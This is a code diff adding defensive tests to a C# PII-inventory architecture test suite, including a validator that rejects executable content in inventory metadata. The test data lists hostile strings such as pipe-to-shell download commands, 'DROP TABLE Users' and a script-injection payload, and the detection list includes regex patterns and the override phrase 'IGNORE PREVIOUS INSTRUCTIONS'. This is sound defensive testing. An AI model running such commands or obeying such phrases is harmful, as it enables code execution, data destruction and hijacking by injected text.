@@ -5,6 +5,7 @@ using Explore.Application.Features.Federation.Atproto.Services;
 using Explore.Persistence;
 using Microsoft.EntityFrameworkCore;
 using Microsoft.EntityFrameworkCore.Metadata;
+using System.Text.RegularExpressions;
 using TUnit.Core;
 
 namespace Event.Architecture.Tests.Privacy;
@@ -19,6 +20,84 @@ public sealed class UserPiiInventoryArchitectureTests
 
         await Assert.That(errors).IsEmpty();
         await Assert.That(entries.Select(entry => entry.Disposition).Distinct().Count()).IsEqualTo(4);
+    }
+
+    [Test]
+    public async Task EveryCopyHasOneCompiledFenceOwner()
+    {
+        System.Reflection.PropertyInfo? fenceOwner = typeof(UserPiiInventoryEntry)
+            .GetProperty("FenceOwner");
+
+        await Assert.That(fenceOwner).IsNotNull();
+        await Assert.That(fenceOwner!.PropertyType).IsEqualTo(typeof(Type));
+        await Assert.That(UserPiiInventory.Entries.All(entry =>
+            fenceOwner.GetValue(entry) is Type owner && owner == typeof(Explore.Domain.PrivacyErasureSaga)))
+            .IsTrue();
+    }
+
+    [Test]
+    public async Task ArbitraryExecutableInstructionsAreRejected()
+    {
+        UserPiiInventoryEntry malformed = UserPiiInventory.Entries[0] with
+        {
+            Copy = "malformed:executable DROP TABLE users"
+        };
+
+        string[] errors = Validate([malformed], requireCoverage: false);
+
+        await Assert.That(errors).Contains("executable-instruction: malformed:executable DROP TABLE users");
+    }
+
+    [Test]
+    public async Task ShellPipeDownloadExecuteInstructionsAreRejected()
+    {
+        string[] executableInstructions =
+        {
+            "curl example.invalid | sh",
+            "wget example.invalid/payload | bash",
+            "cmd.exe /c whoami",
+            "powershell -Command Get-ChildItem",
+            "System.Diagnostics.Process.Start(\"tool\")",
+            "DROP TABLE Users",
+            "System.Reflection.Assembly.Load(payload)",
+            "Activator.CreateInstance(type)",
+            "<script>alert(1)</script>",
+            "javascript:eval(payload)",
+            "subprocess.run(['tool'])",
+            "os.system('tool')",
+            "child_process.exec('tool')"
+        };
+        UserPiiInventoryEntry[] malformed = executableInstructions
+            .Select((instruction, index) => UserPiiInventory.Entries[0] with
+            {
+                Copy = $"malformed:instruction-{index}",
+                Producer = instruction
+            })
+            .ToArray();
+
+        string[] errors = Validate(malformed, requireCoverage: false);
+        string[] expectedErrors = malformed
+            .Select(entry => $"executable-instruction: {entry.Copy}")
+            .Order(StringComparer.Ordinal)
+            .ToArray();
+        await Assert.That(errors).IsEquivalentTo(expectedErrors);
+
+        string[] legitimateProse =
+        {
+            "Download delivery is handled by the provider",
+            "Process ownership is documented by PrivacyErasureSaga",
+            "Assembly metadata remains provider-owned",
+            "Compare the old | new policy labels; retain the approved value"
+        };
+        UserPiiInventoryEntry[] benign = legitimateProse
+            .Select((prose, index) => UserPiiInventory.Entries[0] with
+            {
+                Copy = $"benign:prose-{index}",
+                Producer = prose
+            })
+            .ToArray();
+
+        await Assert.That(Validate(benign, requireCoverage: false)).IsEmpty();
     }
 
     [Test]
@@ -115,8 +194,9 @@ public sealed class UserPiiInventoryArchitectureTests
             valid with { Copy = "malformed:unknown", Disposition = (UserPiiDisposition)999 },
             valid with { Copy = "malformed:ownership", OwnershipKey = "" },
             valid with { Copy = "malformed:producer", Producer = "" },
+            valid with { Copy = "malformed:fence-owner", FenceOwner = null! },
             valid with { Copy = "malformed:horizon", RetentionHorizon = "" },
-            valid with { Copy = "malformed:provider", ProviderAction = "" }
+            valid with { Copy = "malformed:provider", ProviderAction = (UserPiiProviderAction)999 }
         ];
         string[] malformedErrors = Validate(malformed, requireCoverage: false);
 
@@ -124,8 +204,9 @@ public sealed class UserPiiInventoryArchitectureTests
         await Assert.That(malformedErrors).Contains("unknown-disposition: malformed:unknown");
         await Assert.That(malformedErrors).Contains("missing-ownership: malformed:ownership");
         await Assert.That(malformedErrors).Contains("missing-producer: malformed:producer");
+        await Assert.That(malformedErrors).Contains("missing-fence-owner: malformed:fence-owner");
         await Assert.That(malformedErrors).Contains("missing-horizon: malformed:horizon");
-        await Assert.That(malformedErrors).Contains("missing-provider-action: malformed:provider");
+        await Assert.That(malformedErrors).Contains("unknown-provider-action: malformed:provider");
     }
 
     [Test]
@@ -136,7 +217,7 @@ public sealed class UserPiiInventoryArchitectureTests
         await Assert.That(UserPiiInventory.Entries.Any(entry =>
             entry.Copy.Contains("DELETE ", StringComparison.OrdinalIgnoreCase)
             || entry.OwnershipKey.Contains("DELETE ", StringComparison.OrdinalIgnoreCase)
-            || entry.ProviderAction.Contains("DELETE FROM", StringComparison.OrdinalIgnoreCase))).IsFalse();
+            || entry.Producer.Contains("DELETE ", StringComparison.OrdinalIgnoreCase))).IsFalse();
 
         string[] runtimeReferences =
         [
@@ -196,12 +277,27 @@ public sealed class UserPiiInventoryArchitectureTests
             .Select(entry => $"missing-ownership: {entry.Copy}"));
         errors.AddRange(entries.Where(entry => string.IsNullOrWhiteSpace(entry.Producer))
             .Select(entry => $"missing-producer: {entry.Copy}"));
+        errors.AddRange(entries.Where(entry => entry.FenceOwner is null)
+            .Select(entry => $"missing-fence-owner: {entry.Copy}"));
+        errors.AddRange(entries.Where(entry =>
+                entry.FenceOwner is not null && entry.FenceOwner != typeof(Explore.Domain.PrivacyErasureSaga))
+            .Select(entry => $"unknown-fence-owner: {entry.Copy}"));
         errors.AddRange(entries.Where(entry => string.IsNullOrWhiteSpace(entry.RetentionPurpose))
             .Select(entry => $"missing-purpose: {entry.Copy}"));
         errors.AddRange(entries.Where(entry => string.IsNullOrWhiteSpace(entry.RetentionHorizon))
             .Select(entry => $"missing-horizon: {entry.Copy}"));
-        errors.AddRange(entries.Where(entry => string.IsNullOrWhiteSpace(entry.ProviderAction))
+        errors.AddRange(entries.Where(entry => !Enum.IsDefined(entry.ProviderAction))
+            .Select(entry => $"unknown-provider-action: {entry.Copy}"));
+        errors.AddRange(entries.Where(entry =>
+                entry.Disposition == UserPiiDisposition.ExternalAction
+                && entry.ProviderAction == UserPiiProviderAction.None)
             .Select(entry => $"missing-provider-action: {entry.Copy}"));
+        errors.AddRange(entries.Where(entry =>
+                entry.Disposition != UserPiiDisposition.ExternalAction
+                && entry.ProviderAction != UserPiiProviderAction.None)
+            .Select(entry => $"unexpected-provider-action: {entry.Copy}"));
+        errors.AddRange(entries.Where(ContainsExecutableInstruction)
+            .Select(entry => $"executable-instruction: {entry.Copy}"));
         errors.AddRange(entries.Where(entry => entry.PolicyVersion != UserPiiInventory.CurrentPolicyVersion)
             .Select(entry => $"unknown-policy-version: {entry.Copy}"));
         errors.AddRange(entries.Where(entry =>
@@ -242,6 +338,64 @@ public sealed class UserPiiInventoryArchitectureTests
         }
 
         return errors.Distinct(StringComparer.Ordinal).Order(StringComparer.Ordinal).ToArray();
+    }
+
+    private static bool ContainsExecutableInstruction(UserPiiInventoryEntry entry)
+    {
+        if (entry.Copy.Any(character =>
+                !char.IsAsciiLetterOrDigit(character) && character is not '.' and not ':' and not '-' and not '_'))
+        {
+            return true;
+        }
+
+        string[] metadata =
+        [
+            entry.OwnershipKey,
+            entry.Producer,
+            entry.RetentionPurpose,
+            entry.RetentionHorizon
+        ];
+        string[] executableMarkers =
+        [
+            "\r",
+            "\n",
+            "`",
+            "${",
+            "$(",
+            "&&",
+            "||",
+            "<script",
+            "javascript:",
+            "<?php",
+            "#!",
+            "IGNORE PREVIOUS INSTRUCTIONS"
+        ];
+        string[] executablePatterns =
+        [
+            @"\b(?:curl|wget)\b[^\r\n]{0,256}\|\s*(?:sh|bash|zsh|fish|pwsh|powershell)(?:\s|$)",
+            @"\b(?:sh|bash|zsh|fish)\s+-c(?:\s|$)",
+            @"\b(?:pwsh|powershell)(?:\.exe)?\s+(?:-[A-Za-z]*Command\b|-c(?:\s|$))",
+            @"\bcmd(?:\.exe)?\s+/[ck](?:\s|$)",
+            @"(?:^|[;&|]\s*)(?:sudo\s+)?rm\s+-[A-Za-z]*[rRfF][A-Za-z]*\s+",
+            @"(?:^|[;&|]\s*)(?:python(?:3)?|node|perl|ruby)\s+-[ce]\s+",
+            @"\b(?:System\.Diagnostics\.)?Process\.Start\s*\(",
+            @"\bRuntime\.getRuntime\s*\(\s*\)\.exec\s*\(",
+            @"\b(?:subprocess\.(?:run|Popen|call|check_call|check_output)|os\.system|child_process\.(?:exec|execFile|spawn)|Deno\.Command)\s*\(",
+            @"\b(?:System\.Reflection\.)?Assembly\.(?:Load|LoadFrom|LoadFile)\s*\(",
+            @"\bActivator\.CreateInstance\s*\(",
+            @"\bType\.GetType\s*\(",
+            @"\bMethodInfo\.Invoke\s*\(",
+            @"\b(?:eval|exec)\s*\(",
+            @"\b(?:DROP\s+TABLE|DELETE\s+FROM|TRUNCATE\s+(?:TABLE\s+)?|ALTER\s+TABLE|INSERT\s+INTO|UPDATE\s+\S+\s+SET|EXEC(?:UTE)?\s+)"
+        ];
+
+        return metadata.Any(value =>
+            executableMarkers.Any(marker => value.Contains(marker, StringComparison.OrdinalIgnoreCase))
+            || executablePatterns.Any(pattern => Regex.IsMatch(
+                value,
+                pattern,
+                RegexOptions.IgnoreCase | RegexOptions.CultureInvariant,
+                TimeSpan.FromMilliseconds(100))));
     }
 
     private static string[] DiscoverSourceDerivedLocalCopies(IModel model)
